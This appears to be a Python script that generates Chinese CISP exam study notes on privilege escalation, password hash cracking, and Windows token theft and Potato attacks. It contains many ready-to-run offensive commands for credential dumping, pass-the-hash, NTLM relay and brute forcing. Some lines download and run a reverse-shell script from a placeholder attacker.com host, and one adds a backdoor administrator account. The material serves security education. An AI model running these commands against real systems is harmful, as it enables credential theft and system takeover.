| 3 | JuicyPotato | ★★★★ | ★★ | 利用SeImpersonate特权 |
| 4 | 未引号服务路径 | ★★★★ | ★★ | 空格路径解析漏洞 |
| 5 | Mimikatz | ★★★★★ | ★★ | 提取lsass.exe内存中的凭据 |
| 6 | SUID提权 | ★★★★ | ★★ | find / -perm -4000 |
| 7 | sudo -l提权 | ★★★★ | ★★ | 检查可sudo执行的命令 |
| 8 | UAC绕过 | ★★★ | ★★★ | fodhelper/eventvwr |
| 9 | DirtyCow | ★★★★ | ★★ | CVE-2016-5195 |
| 10 | 凭据窃取 | ★★★★ | ★★ | 配置文件、内存、注册表 |

### 💡 知识巧记口诀

> **"提权三步骤"** — 信息收集（systeminfo/sudo -l）、漏洞识别（补丁对比/SUID查找）、漏洞利用（EXP执行）。记住：**"收识用"**。

> **"Windows提权四条路"** — 内核漏洞、服务配置、计划任务、凭据窃取。记住：**"内核服务任务凭据"**。

> **"Linux提权三条路"** — SUID文件、Sudo配置、内核漏洞。记住：**"SSK"**——SUID、Sudo、Kernel。

### 🎯 考试陷阱提醒

| 陷阱 | 正确理解 |
|:---|:---|
| "提权只需要找内核漏洞" | ❌ 错误！配置错误是最常见的提权路径 |
| "sudo -l列出的命令都可以提权" | ❌ 错误！需要具体命令支持shell escape |
| "Mimikatz总是需要管理员权限" | ❌ 错误！某些功能低权限也能使用 |
| "所有SUID文件都可以提权" | ❌ 错误！需要具体文件支持命令执行 |

---

## 学习建议

1. 🔍 **养成信息收集习惯**：拿到shell后第一件事就是系统信息收集
2. 📊 **建立提权检查清单**：按类别逐项检查，不遗漏任何提权路径
3. 🧪 **搭建提权实验环境**：Windows 7/10虚拟机 + Metasploitable3
4. 🔧 **精通WinPEAS/LinPEAS**：这是提权的瑞士军刀
5. 🛡️ **理解防御原理**：知道怎么防御才知道怎么绕过

---

> **权限提升是渗透测试的"拐点"——从这一刻起，你不再是"访客"，而是"主人"。掌握了提权技术，你才真正拥有了完整的攻击能力。**
""")

# ===================================================================
# Day 16：本地密码哈希破解
# ===================================================================
gen('day-16.md', """# Day 16：本地密码哈希破解

> **📘 文档定位**：CISP 考试核心基础 | 难度：中级 | 预计阅读：45 分钟
>
> 密码哈希破解是渗透测试中的核心技能。在获得系统访问权限后，提取并破解密码哈希是横向移动和权限提升的关键步骤。从Windows的NTLM哈希到Linux的/etc/shadow，从John the Ripper到Hashcat，本章将全面覆盖密码哈希的获取、格式理解和破解技术。

---

## 导航目录

- [一、密码哈希基础](#一密码哈希基础)
- [二、Windows密码哈希获取](#二windows密码哈希获取)
- [三、Linux密码哈希获取](#三linux密码哈希获取)
- [四、Hashcat GPU破解](#四hashcat-gpu破解)
- [五、John the Ripper破解](#五john-the-ripper破解)
- [六、彩虹表攻击](#六彩虹表攻击)
- [七、哈希传递与中继](#七哈希传递与中继)
- [八、在线服务密码破解](#八在线服务密码破解)
- [九、密码破解防御](#九密码破解防御)
- [十、高分考点与知识巧记](#十高分考点与知识巧记)

---

## 一、密码哈希基础

### 1.1 常见哈希类型

| 哈希类型 | 示例标识 | 长度 | 常见场景 |
|:---|:---|:---|:---|
| NTLM | $NT$ | 32 hex | Windows本地/域 |
| LM | $LM$ | 32 hex | 旧版Windows |
| NetNTLMv1 | $NETNTLM$ | 变长 | SMB/NTLM认证 |
| NetNTLMv2 | $NETNTLM$ | 变长 | SMB/NTLM认证 |
| MD5 | $1$ 或 $apr1$ | 32 hex | 旧Linux/BSD |
| SHA-256 | $5$ | 64 hex | Linux shadow |
| SHA-512 | $6$ | 128 hex | 现代Linux |
| WPA/WPA2 | WPA-PBKDF2-PMKID | 64 hex | WiFi |
| Kerberos TGT | $krb5tgs$ | 变长 | Active Directory |

### 1.2 哈希格式识别

```bash
# 使用hashid识别
hashid '5f4dcc3b5aa765d61d8327deb882cf99'
hashid '$6$salt$hashedpassword'

# 使用hash-identifier
hash-identifier

# 手动识别
# $1$ = MD5 crypt
# $5$ = SHA-256 crypt
# $6$ = SHA-512 crypt
# $2a$/$2b$/$2y$ = bcrypt
# $NT$ = NTLM
# 32位十六进制 = 可能是MD5/NTLM/LM
# 40位十六进制 = SHA-1
# 64位十六进制 = SHA-256
# 128位十六进制 = SHA-512
```

> **🔑 高分考点**：NTLM哈希是Windows系统的核心，格式为32位十六进制。LM哈希已废弃但仍可能存在于旧系统中。Linux现代系统使用$6$（SHA-512）格式。

---

## 二、Windows密码哈希获取

### 2.1 SAM文件提取

```bash
# SAM文件位置
C:\\Windows\\System32\\config\\SAM
C:\\Windows\\System32\\config\\SYSTEM

# 方法1：reg save（需要管理员权限）
reg save HKLM\\SAM sam.save
reg save HKLM\\SYSTEM system.save

# 方法2：卷影副本
vssadmin create shadow /for=C:
copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM sam.copy
copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM system.copy

# 方法3：使用Impacket
python3 secretsdump.py -sam sam.save -system system.save LOCAL
python3 secretsdump.py LOCAL

# 输出格式：
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
# 第一个哈希：LM哈希（全为aad3...表示不使用）
# 第二个哈希：NTLM哈希
```

### 2.2 Mimikatz提取

```bash
# Mimikatz提取凭据
mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords" exit

# 提取Kerberos票据
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit

# 提取SAM
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" exit

# DCSync（域控制器）
mimikatz.exe "lsadump::dcsync /user:Administrator" exit
```

### 2.3 NTDS.dit提取

```bash
# 域控制器密码数据库
# 使用ntdsutil
ntdsutil "activate instance ntds" "ifm" "create full c:\\temp\\ntds" quit quit

# 使用vssadmin
vssadmin create shadow /for=C:
copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit c:\\temp\\ntds.dit

# 提取哈希
python3 secretsdump.py -ntds ntds.dit -system system.save LOCAL
```

---

## 三、Linux密码哈希获取

### 3.1 /etc/shadow

```bash
# 读取shadow文件（需要root）
cat /etc/shadow

# 格式：
# username:$hash_type$salt$hash:last_changed:min:max:warn:inactive:expire

# 示例：
# root:$6$salt123$hashedpasswordhere:18900:0:99999:7:::

# 提取可破解的哈希
cat /etc/shadow | grep '\\$' > hashes.txt

# 如果只有/etc/passwd（旧系统）
cat /etc/passwd
unshadow /etc/passwd /etc/shadow > combined.txt
```

### 3.2 其他凭据来源

```bash
# 历史文件
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.python_history
cat /root/.bash_history

# SSH密钥
cat ~/.ssh/id_rsa
cat ~/.ssh/authorized_keys
find / -name "id_rsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null

# 配置文件
grep -r "password" /etc/ 2>/dev/null
grep -r "DB_PASSWORD" /var/www/ 2>/dev/null
find / -name ".env" 2>/dev/null
find / -name "wp-config.php" 2>/dev/null

# 数据库凭据
cat /var/www/html/wp-config.php | grep DB_
cat /var/www/html/configuration.php
```

---

## 四、Hashcat GPU破解

### 4.1 Hashcat基础

```bash
# Hashcat安装
sudo apt install hashcat
# 或
git clone https://github.com/hashcat/hashcat.git

# 基础用法
hashcat -m [哈希类型] -a [攻击模式] [哈希文件] [字典文件]

# 哈希类型(-m)
# 0     = MD5
# 100   = SHA-1
# 1000  = NTLM
# 1800  = SHA-512 crypt ($6$)
# 3000  = LM
# 5500  = NetNTLMv1
# 5600  = NetNTLMv2
# 13100 = Kerberos 5 TGS-REP
# 16800 = WPA-PMKID-PBKDF2
# 22000 = WPA-PBKDF2-PMKID+EAPOL
# 3200  = bcrypt ($2a$)

# 攻击模式(-a)
# 0 = 字典攻击（Straight）
# 1 = 组合攻击（Combination）
# 3 = 掩码攻击（Brute-force/Mask）
# 6 = 字典+掩码（Hybrid Wordlist + Mask）
# 7 = 掩码+字典（Hybrid Mask + Wordlist）
```

### 4.2 Hashcat字典攻击

```bash
# 基础字典攻击
hashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt

# 使用规则
hashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/d3ad0ne.rule

# 显示破解结果
hashcat -m 1000 ntlm_hashes.txt --show

# 优化选项
hashcat -m 1000 -a 0 -O ntlm_hashes.txt rockyou.txt          # 优化内核
hashcat -m 1000 -a 0 -w 4 ntlm_hashes.txt rockyou.txt        # 最大负载
hashcat -m 1000 -a 0 --force ntlm_hashes.txt rockyou.txt     # 强制运行

# 恢复中断的会话
hashcat --session mysession --restore
```

### 4.3 Hashcat掩码攻击

```bash
# 掩码攻击（暴力破解）
# 内置字符集
# ?l = abcdefghijklmnopqrstuvwxyz
# ?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ
# ?d = 0123456789
# ?s = !"#$%&'()*+,-./:;<=>?@[\\]^_`{{|}}~
# ?a = ?l?u?d?s
# ?b = 0x00 - 0xff

# 8位数字密码
hashcat -m 1000 -a 3 ntlm_hashes.txt ?d?d?d?d?d?d?d?d

# 8位小写字母+数字
hashcat -m 1000 -a 3 ntlm_hashes.txt -1 ?l?d ?1?1?1?1?1?1?1?1

# 特定格式：大写+5个小写+2个数字
hashcat -m 1000 -a 3 ntlm_hashes.txt ?u?l?l?l?l?l?d?d

# 公司名+年份+特殊字符
hashcat -m 1000 -a 3 ntlm_hashes.txt Company?d?d?d?d?s
```

---

## 五、John the Ripper破解

### 5.1 John基础用法

```bash
# John基础
john hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# 指定格式
john --format=NT hashes.txt
john --format=raw-md5 hashes.txt
john --format=sha512crypt hashes.txt

# 查看破解结果
john --show hashes.txt
john --show --format=NT hashes.txt

# 恢复中断
john --restore
```

### 5.2 John规则

```bash
# 使用规则
john --wordlist=rockyou.txt --rules hashes.txt
john --wordlist=rockyou.txt --rules=Jumbo hashes.txt

# 自定义规则（/etc/john/john.conf）
# [List.Rules:MyRule]
# Az"[0-9][0-9]"    # 单词首字母大写+两个数字
# $[0-9]$[0-9]      # 单词后加两个数字
# cAz"[0-9][0-9]!"  # 首字母大写+两个数字+!
```

### 5.3 其他John工具

```bash
# unshadow（合并passwd和shadow）
unshadow /etc/passwd /etc/shadow > combined.txt

# zip2john（ZIP密码哈希提取）
zip2john encrypted.zip > zip_hash.txt

# rar2john（RAR密码哈希提取）
rar2john encrypted.rar > rar_hash.txt

# ssh2john（SSH私钥哈希提取）
ssh2john id_rsa > ssh_hash.txt

# keepass2john（KeePass哈希提取）
keepass2john database.kdbx > keepass_hash.txt

# office2john（Office文档哈希提取）
office2john document.docx > office_hash.txt
```

---

## 六、彩虹表攻击

### 6.1 彩虹表原理

彩虹表是预先计算好的哈希-明文对照表，通过时间换空间实现快速破解：

```bash
# 彩虹表特点
# 优点：极快的查找速度
# 缺点：占用大量磁盘空间、仅对无盐哈希有效

# Ophcrack（Windows LM/NTLM彩虹表）
ophcrack -t tables_xp_free_small -d sampledir -w outputdir

# rcracki_mt
rcracki_mt -h [hash] -t [table_dir]
```

### 6.2 在线彩虹表

```bash
# 在线查询服务
# https://crackstation.net/
# https://hashes.org/
# https://www.cmd5.org/
# https://hashkiller.io/

# 使用CrackStation查询
curl "https://api.crackstation.net/api/lookup?hash=5f4dcc3b5aa765d61d8327deb882cf99"
```

---

## 七、哈希传递与中继

### 7.1 Pass The Hash (PtH)

```bash
# 使用NTLM哈希认证（不需要明文密码）
# Impacket psexec
python3 psexec.py administrator@192.168.1.100 -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# Impacket wmiexec
python3 wmiexec.py administrator@192.168.1.100 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0

# CrackMapExec
crackmapexec smb 192.168.1.100 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0

# Mimikatz
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:administrator /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0 /domain:corp.local"
```

### 7.2 NTLM Relay

```bash
# Responder + NTLM Relay
# 启动Responder（关闭SMB和HTTP）
responder -I eth0 -rdwv

# 启动ntlmrelayx
python3 ntlmrelayx.py -tf targets.txt -smb2support

# 等待受害者触发（LLMNR/NBT-NS/mDNS欺骗）
```

---

## 八、在线服务密码破解

### 8.1 Hydra

```bash
# SSH
hydra -l root -P passwords.txt ssh://192.168.1.100
hydra -L users.txt -P passwords.txt ssh://192.168.1.100

# FTP
hydra -l admin -P passwords.txt ftp://192.168.1.100

# HTTP POST表单
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid"

# RDP
hydra -l administrator -P passwords.txt rdp://192.168.1.100

# MySQL
hydra -l root -P passwords.txt mysql://192.168.1.100

# SMB
hydra -l administrator -P passwords.txt smb://192.168.1.100

# 优化参数
hydra -L users.txt -P passwords.txt -t 4 -w 10 ssh://192.168.1.100
```

### 8.2 Medusa

```bash
medusa -h 192.168.1.100 -u root -P passwords.txt -M ssh
medusa -H hosts.txt -U users.txt -P passwords.txt -M ssh -t 4
```

---

## 九、密码破解防御

| 防御措施 | 描述 | 效果 |
|:---|:---|:---|
| 强密码策略 | 长度>=12, 复杂度要求 | 增加暴力破解难度 |
| 账户锁定 | N次失败后锁定 | 防止在线暴力破解 |
| 盐值 | 每个哈希独立随机盐 | 防止彩虹表 |
| 慢哈希算法 | bcrypt/argon2 | 增加破解时间成本 |
| 多因素认证 | MFA | 即使密码泄露也无法登录 |
| 密码管理器 | 鼓励使用强随机密码 | 减少密码重用 |

---

## 十、高分考点与知识巧记

### 📌 高分考点速查表

| 序号 | 考点 | 考试频率 | 难度 | 关键答案 |
|:---:|:---|:---:|:---:|:---|
| 1 | NTLM哈希格式 | ★★★★★ | ★ | 32位十六进制，Windows认证核心 |
| 2 | SAM文件路径 | ★★★★ | ★ | C:\\Windows\\System32\\config\\SAM |
| 3 | Mimikatz功能 | ★★★★★ | ★★ | 提取内存中的明文密码和哈希 |
| 4 | Hashcat模式 | ★★★★ | ★★ | -m哈希类型 -a攻击模式 |
| 5 | Pass The Hash | ★★★★★ | ★★ | 使用NTLM哈希直接认证 |
| 6 | John the Ripper | ★★★ | ★★ | CPU破解工具，支持多种格式 |
| 7 | Linux shadow格式 | ★★★★ | ★ | $6$ = SHA-512 |
| 8 | 彩虹表限制 | ★★★ | ★★ | 仅对无盐哈希有效 |
| 9 | Hydra功能 | ★★★ | ★★ | 在线服务暴力破解 |
| 10 | 哈希加盐 | ★★★★ | ★★ | 每个用户独立随机盐值 |

### 💡 知识巧记口诀

> **"哈希破解三神器"** — Hashcat（GPU快）、John（CPU稳）、彩虹表（无盐快）。记住：**"GPU快CPU稳彩虹无盐"**。

> **"Hashcat三要素"** — -m（哈希类型）、-a（攻击模式）、wordlist（字典）。记住：**"类型模式字典"**。

> **"凭据获取三来源"** — SAM文件（本地）、LSASS内存（Mimikatz）、NTDS.dit（域控）。记住：**"本地内存域控"**。

### 🎯 考试陷阱提醒

| 陷阱 | 正确理解 |
|:---|:---|
| "所有哈希都可以用彩虹表破解" | ❌ 错误！有盐哈希无法使用彩虹表 |
| "Pass The Hash需要明文密码" | ❌ 错误！PtH使用NTLM哈希直接认证 |
| "Hashcat只能在GPU上运行" | ❌ 错误！也支持CPU模式 |
| "Hydra只支持SSH" | ❌ 错误！支持几十种协议 |

---

## 学习建议

1. 🔧 **配置Hashcat环境**：安装CUDA/OpenCL驱动，充分利用GPU
2. 📚 **建立字典库**：收集SecLists、rockyou、weakpass等高质量字典
3. 🧠 **理解哈希算法**：了解MD5→SHA1→SHA256→bcrypt的演进
4. 🛡️ **学习防御视角**：理解密码策略、MFA、慢哈希的重要性
5. 🔗 **掌握PtH链**：密码哈希→Pass The Hash→横向移动

---

> **密码破解不是蛮力，是艺术——好的字典、好的规则、好的策略，三者结合才能在有限时间内取得最大收益。永远先尝试弱密码，再尝试字典，最后才考虑暴力破解。**
""")

print("\nDays 1-16 done, continuing with days 17-30...")

# ===================================================================
# Day 17：令牌窃取与Rotten Potato
# ===================================================================
gen('day-17.md', """# Day 17：令牌窃取与Rotten Potato

> **📘 文档定位**：CISP 考试核心基础 | 难度：高级 | 预计阅读：45 分钟
>
> Windows的访问令牌（Access Token）是进程身份的标识。在渗透测试中，窃取高权限令牌是提权的重要手段。从Incognito到各种Potato攻击，令牌操作技术一直在进化。本章将深入探讨Windows令牌机制及其在提权中的利用。

---

## 导航目录

- [一、Windows令牌基础](#一windows令牌基础)
- [二、令牌窃取技术](#二令牌窃取技术)
- [三、Incognito工具实战](#三incognito工具实战)
- [四、Rotten Potato原理与利用](#四rotten-potato原理与利用)
- [五、Juicy Potato实战](#五juicy-potato实战)
- [六、PrintSpoofer技术](#六printspoofer技术)
- [七、令牌操作在Metasploit中](#七令牌操作在metasploit中)
- [八、令牌攻击防御](#八令牌攻击防御)
- [九、实战攻击链](#九实战攻击链)
- [十、高分考点与知识巧记](#十高分考点与知识巧记)

---

## 一、Windows令牌基础

### 1.1 访问令牌

访问令牌（Access Token）是Windows安全体系的核心概念。每个进程都有一个主令牌，表示该进程的安全上下文：

```
访问令牌包含的信息：
├── 用户SID (Security Identifier)
├── 组SID (包括所有组成员身份)
├── 特权列表 (Privileges)
│   ├── SeImpersonatePrivilege
│   ├── SeAssignPrimaryTokenPrivilege
│   ├── SeDebugPrivilege
│   ├── SeTakeOwnershipPrivilege
│   ├── SeBackupPrivilege
│   ├── SeRestorePrivilege
│   ├── SeLoadDriverPrivilege
│   └── SeTcbPrivilege
├── 默认DACL
├── 令牌类型 (主令牌/模拟令牌)
└── 模拟级别
```

### 1.2 关键特权

| 特权 | 描述 | 提权潜力 |
|:---|:---|:---|
| SeImpersonatePrivilege | 模拟客户端身份 | 极高 |
| SeAssignPrimaryTokenPrivilege | 分配主令牌 | 极高 |
| SeDebugPrivilege | 调试进程 | 高 |
| SeTakeOwnershipPrivilege | 取得所有权 | 中 |
| SeBackupPrivilege | 备份文件和目录 | 高（可读任意文件） |
| SeRestorePrivilege | 还原文件和目录 | 高（可写任意文件） |
| SeLoadDriverPrivilege | 加载设备驱动 | 极高 |
| SeTcbPrivilege | 操作系统的一部分 | 极高 |

> **🔑 高分考点**：SeImpersonatePrivilege 是令牌窃取的核心。拥有此特权的进程可以模拟任何连接到它的客户端的安全上下文。IIS、SQL Server等服务的账户通常拥有此特权。

---

## 二、令牌窃取技术

### 2.1 令牌窃取原理

```
令牌窃取流程：
1. 枚举系统上所有进程的令牌
2. 找到高权限进程（如SYSTEM）
3. 复制或窃取其令牌
4. 使用窃取的令牌创建新进程
```

### 2.2 使用Meterpreter

```bash
# Meterpreter令牌操作
meterpreter > getuid                           # 查看当前用户
meterpreter > use incognito                    # 加载Incognito
meterpreter > list_tokens -u                   # 列出用户令牌
meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"  # 模拟SYSTEM令牌
meterpreter > getuid                           # 验证
meterpreter > rev2self                         # 恢复原令牌
meterpreter > steal_token 1234                 # 窃取PID 1234的令牌
meterpreter > drop_token                       # 丢弃当前令牌
```

### 2.3 使用Cobalt Strike

```bash
# Cobalt Strike令牌操作
beacon> steal_token 1234                       # 窃取PID 1234的令牌
beacon> rev2self                               # 恢复
beacon> make_token DOMAIN\\user password       # 使用凭据创建令牌
beacon> spawnas DOMAIN\\user password          # 以指定用户运行进程
```

---

## 三、Incognito工具实战

### 3.1 Incognito独立版

```bash
# Incognito - 令牌操作工具
# 下载：https://github.com/FSecureLABS/incognito

# 列出令牌
incognito.exe list_tokens -u

# 以SYSTEM权限执行命令
incognito.exe execute -c "NT AUTHORITY\\SYSTEM" cmd.exe

# 添加用户（使用SYSTEM令牌）
incognito.exe execute -c "NT AUTHORITY\\SYSTEM" "net user hacker P@ssw0rd /add"
incognito.exe execute -c "NT AUTHORITY\\SYSTEM" "net localgroup administrators hacker /add"
```

### 3.2 手动令牌枚举

```powershell
# PowerShell令牌枚举
# 查看当前进程特权
whoami /priv

# 查看所有进程
Get-Process -IncludeUserName | Where-Object {$_.UserName -eq "NT AUTHORITY\\SYSTEM"}

# 使用PowerSploit枚举令牌
Import-Module .\\PowerUp.ps1
Get-ProcessTokenPrivilege
```

---

## 四、Rotten Potato原理与利用

### 4.1 Rotten Potato原理

Rotten Potato攻击利用SeImpersonatePrivilege特权，通过NTLM反射获取SYSTEM令牌：

```
Rotten Potato攻击流程：
1. 攻击者进程有SeImpersonatePrivilege
2. 创建本地TCP监听器
3. 使用CoGetInstanceFromIStorage触发NTLM认证
4. 目标（SYSTEM）连接到攻击者监听器
5. 攻击者接受连接并进行NTLM协商
6. 调用AcceptSecurityContext获取SYSTEM模拟令牌
7. 使用模拟令牌创建进程
```

### 4.2 Rotten Potato实现

```bash
# 编译RottenPotato
# 检查是否有SeImpersonatePrivilege
whoami /priv | findstr "SeImpersonatePrivilege"

# 执行
RottenPotato.exe
# 或指定命令
RottenPotato.exe cmd.exe

# Potato利用的关键条件
# 1. SeImpersonatePrivilege 或 SeAssignPrimaryTokenPrivilege
# 2. 能够创建本地连接
# 3. 正确的COM对象CLSID
```

---

## 五、Juicy Potato实战

### 5.1 Juicy Potato原理

Juicy Potato是Rotten Potato的升级版，支持选择不同的CLSID：

```bash
# Juicy Potato使用
# 基本用法
JuicyPotato.exe -l 1337 -p cmd.exe -t *

# 参数说明
# -l: COM监听端口
# -p: 要执行的程序
# -a: 程序参数
# -t: 创建进程的调用方式 (* 表示两者都尝试)
# -c: CLSID (COM对象ID)

# 完整示例
JuicyPotato.exe -l 1337 -p "c:\\windows\\system32\\cmd.exe" -a "/c whoami > c:\\temp\\result.txt" -t * -c {{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}}

# 测试不同的CLSID
JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {{CLSID_HERE}}
```

### 5.2 CLSID选择

```bash
# Windows版本对应的CLSID
# Windows 10 Pro: {{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}}
# Windows Server 2019: {{...}}

# 查看系统CLSID列表
# https://github.com/ohpe/juicy-potato/tree/master/CLSID

# 使用GetCLSID.ps1查找
Import-Module .\\GetCLSID.ps1
Get-CLSID -Usage "LocalService"
```

---

## 六、PrintSpoofer技术

### 6.1 PrintSpoofer原理

PrintSpoofer利用打印机服务的命名管道模拟实现提权：

```bash
# PrintSpoofer (PipePotato)
# 原理：利用Windows打印机的命名管道
# 命名管道：\\\\.\\pipe\\spoolss
# 触发SYSTEM连接并进行模拟

# 使用
PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -c "powershell -ep bypass IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/rev.ps1')"

# 优势：
# 1. 不需要CLSID
# 2. 更可靠
# 3. 适用于Windows 10/11, Server 2016/2019/2022
```

### 6.2 SweetPotato

```bash
# SweetPotato - 新一代Potato工具
# 集成了多种提权技术
SweetPotato.exe -p cmd.exe -a "/c whoami"
SweetPotato.exe -e EfsRpc -p cmd.exe

# 支持的技术
# -e: 选择利用技术
#   PrintSpoofer
#   EfsRpc
#   PetitPotam
```

---

## 七、令牌操作在Metasploit中

### 7.1 Metasploit令牌命令

```bash
msfconsole

# 获得Meterpreter会话后
meterpreter > getuid
meterpreter > getsystem -h
# Technique 0: 所有技术
# Technique 1: 命名管道模拟 (Service - Named Pipe)
# Technique 2: 令牌复制 (Named Pipe Impersonation)
# Technique 3: 令牌窃取 (Token Duplication)

meterpreter > getsystem -t 1

# 使用incognito
meterpreter > use incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"

# 进程迁移
meterpreter > ps
meterpreter > migrate 1234  # 迁移到SYSTEM进程
```

### 7.2 本地提权模块

```bash
# Metasploit本地提权模块
use exploit/windows/local/service_permissions
use exploit/windows/local/always_install_elevated
use exploit/windows/local/bypassuac
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
set SESSION 1
run
```

---

## 八、令牌攻击防御

| 防御措施 | 描述 | 效果 |
|:---|:---|:---|
| 最小权限原则 | 移除不必要的特权 | 减少攻击面 |
| 禁用不必要的服务 | 停止不需要的COM组件 | 减少可利用的CLSID |
| 服务账户分离 | 使用Managed Service Account | 限制令牌窃取影响 |
| 应用程序白名单 | 阻止未知程序执行 | 阻止Potato工具运行 |
| EDR监控 | 检测令牌操作行为 | 实时告警 |
| 禁用SeImpersonate | 对Web账户移除模拟特权 | 阻止Potato类攻击 |

---

## 九、实战攻击链

```bash
# 完整攻击链：WebShell → 令牌窃取 → SYSTEM
# Step 1: 获得低权限Shell
# 通过文件上传或SQL注入获得IIS AppPool权限

# Step 2: 检查特权
whoami /priv
# 发现 SeImpersonatePrivilege

# Step 3: 上传Potato工具
certutil -urlcache -split -f http://attacker.com/JuicyPotato.exe JP.exe

# Step 4: 执行提权
JP.exe -l 1337 -p cmd.exe -a "/c powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/rev.ps1')" -t *

# Step 5: 获得SYSTEM Shell
# 攻击机监听
nc -lvnp 4444
```

---

## 十、高分考点与知识巧记

### 📌 高分考点速查表

| 序号 | 考点 | 考试频率 | 难度 | 关键答案 |
|:---:|:---|:---:|:---:|:---|
| 1 | 访问令牌定义 | ★★★★ | ★★ | 进程安全上下文的标识 |
| 2 | SeImpersonatePrivilege | ★★★★★ | ★★ | 模拟客户端身份的特权 |
| 3 | Potato攻击原理 | ★★★★ | ★★★ | NTLM反射+令牌模拟 |
| 4 | JuicyPotato参数 | ★★★ | ★★ | -l端口 -p程序 -t方式 -c CLSID |
| 5 | PrintSpoofer | ★★★ | ★★ | 利用打印命名管道 |
| 6 | Meterpreter getsystem | ★★★★ | ★★ | 三种技术：命名管道/令牌复制/令牌窃取 |
| 7 | Incognito | ★★★ | ★★ | 令牌枚举和模拟工具 |
| 8 | 进程迁移 | ★★★ | ★★ | migrate到SYSTEM进程 |
| 9 | 令牌窃取防御 | ★★★ | ★★ | 最小权限+禁用不必要特权 |
| 10 | CLSID作用 | ★★★ | ★★★ | COM对象标识符，触发认证 |

### 💡 知识巧记口诀

> **"Potato三兄弟"** — Rotten（原始版）、Juicy（可选CLSID）、Print（命名管道）。记住：**"R原J选P管道"**。

> **"令牌操作三步骤"** — 枚举令牌（list_tokens）、模拟令牌（impersonate_token）、执行命令（getsystem）。记住：**"枚举模拟执行"**。

> **"提权关键特权"** — SeImpersonate（模拟）、SeDebug（调试）、SeBackup（备份读取）、SeRestore（还原写入）。记住：**"模拟调试备份还原"**。

### 🎯 考试陷阱提醒

| 陷阱 | 正确理解 |
|:---|:---|
| "所有进程都可以模拟令牌" | ❌ 错误！需要SeImpersonatePrivilege |
| "getsystem只需要一个命令" | ❌ 不准确！不同环境需要不同技术 |
| "Potato攻击在所有Windows版本有效" | ❌ 错误！需要对应版本的CLSID |
| "令牌窃取一定会被记录" | ❌ 不绝对！取决于审计策略配置 |

---

## 学习建议

1. 🔍 **理解Windows安全模型**：深入学习访问令牌、SID、特权的工作机制
2. 🧪 **在Windows Server上实验**：搭建IIS + 低权限Shell环境练习
3. 📊 **收集CLSID库**：不同Windows版本需要不同的CLSID
4. 🛡️ **学习EDR检测方法**：了解安全产品如何检测令牌操作
5. 🔗 **掌握完整攻击链**：WebShell → 特权检查 → Potato → SYSTEM

---

> **令牌是Windows安全的"身份证"——窃取了一个SYSTEM令牌，你就获得了SYSTEM的身份。在Windows世界中，你是谁取决于你拿着谁的令牌，而不是你真正是谁。**
""")

# ===================================================================
# Day 18：Linux权限提升
# ===================================================================
gen('day-18.md', """# Day 18：Linux权限提升

> **📘 文档定位**：CISP 考试核心基础 | 难度：高级 | 预计阅读：50 分钟
>
> Linux权限提升是渗透测试中的关键技能。从SUID文件到内核漏洞，从Cron任务劫持到Sudo配置滥用，Linux提供了丰富的提权攻击面。本章将系统性地覆盖Linux提权的各种技术路径，包括实战工具和手工方法。

---

## 导航目录

- [一、Linux权限模型](#一linux权限模型)
- [二、系统信息收集](#二系统信息收集)
- [三、SUID提权技术](#三suid提权技术)
- [四、Sudo配置滥用](#四sudo配置滥用)
- [五、Capabilities提权](#五capabilities提权)
- [六、Cron任务劫持](#六cron任务劫持)
- [七、Linux内核漏洞提权](#七linux内核漏洞提权)
- [八、Docker容器逃逸](#八docker容器逃逸)
- [九、提权自动化工具](#九提权自动化工具)
- [十、高分考点与知识巧记](#十高分考点与知识巧记)

---

## 一、Linux权限模型

### 1.1 用户与组

```bash
# UID分类
# 0: root（超级用户）
# 1-999: 系统用户
# 1000+: 普通用户

# 查看用户信息
id
whoami
cat /etc/passwd
cat /etc/shadow
cat /etc/group

# passwd文件格式
# username:x:UID:GID:comment:home:shell
```

### 1.2 文件权限

```bash
# 权限表示
# -rwxr-xr-x 1 owner group size date filename
#  └─┬─┘└─┬─┘└─┬─┘
#  owner group other

# 特殊权限
# SUID (4): -rws------  文件以所有者权限执行
# SGID (2): -rwxr-s---  文件以所属组权限执行
# Sticky(1): -rwxrwxrwt 仅所有者可删除

# 查看SUID文件
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# 查看SGID文件
find / -perm -2000 -type f 2>/dev/null

# 查看可写文件
find / -writable -type f 2>/dev/null
```

